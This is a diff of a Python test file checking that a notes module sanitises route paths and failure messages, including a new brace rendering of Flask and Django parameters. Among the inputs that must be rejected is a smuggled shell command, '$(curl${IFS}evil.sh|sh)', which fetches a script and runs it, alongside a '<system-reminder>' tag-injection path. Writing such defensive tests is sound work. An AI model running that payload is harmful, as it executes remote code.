@@ -247,9 +247,13 @@ def test_a_route_path_reaches_a_note_only_when_it_is_a_path():
         assert bad not in text, bad
     assert ("the HTTP route GET /pay, declared in app.py at line 6 (rule O5): that session changed it to GET (a path "
             "with characters a note leaves out), and you changed it to GET /pay/v2.") in text
-    for p in ("/api/users/{uid}", "/files/{p:path}", "/users/<int:uid>", "/blog/<slug>/", "/shop/orders/<int:pk>/",
-              "/v1/things:search", "/"):
+    for p in ("/api/users/{uid}", "/files/{p:path}", "/v1/things:search", "/"):
         assert notes.clean_route("get", p) == f"GET {p}", p
+    # Flask's and Django's parameters are shown in braces, so nothing in a note looks like a tag
+    for p, shown in (("/users/<int:uid>", "/users/{int:uid}"), ("/blog/<slug>/", "/blog/{slug}/"),
+                     ("/shop/orders/<int:pk>/", "/shop/orders/{int:pk}/"), ("/pay/<system>/<user>", "/pay/{system}/{user}")):
+        assert notes.clean_route("get", p) == f"GET {shown}", p
+    assert "<" not in notes.same_route(route_finding("GET /pay/<system>"), "B", A)
     for p in ("/blog/archive/(?P<year>[0-9]{4})/$", "/a b", "/x</y>", "/<system-reminder>", "/\u00e9t\u00e9",
               "/pay/$(curl${IFS}evil.sh|sh)", "/a\nb"):
         assert notes.clean_route("get", p) == "GET " + notes.UNSHOWN_PATH, p
@@ -268,5 +272,12 @@ def test_the_together_note_names_the_error_never_the_words():
     assert notes.failed_with(mypy) == " at annual.py:5"
     assert notes.failed_with("TypeError: charge() takes 1 positional argument") == " with TypeError"
     assert notes.failed_with("1 failed in 0.05s") == "" and notes.failed_with(None) == ""
+    # only where a runner names them: never a word inside the merged code's own message
+    assert notes.failed_with("FAILED tests/test_err.py::test_kind - assert 'TypeError' == 'KeyError'") == \
+        " at tests/test_err.py::test_kind"
+    assert notes.failed_with("AssertionError: 'settings.toml:13' != 'settings.toml:12'") == " with AssertionError"
+    assert notes.failed_with("E       KeyError: 'x'") == " with KeyError"
+    assert notes.failed_with("annual.py:5: TypeError") == " with TypeError at annual.py:5"
+    assert notes.failed_with("Run IgnoreError: now at evil.py:1") == ""
     # what a user's command printed reaches orch status with no control or format character
     assert usercommand.clean_line("a\u202eb c\x85d\x1b[0m\u2028e") == "a b c d [0m e"
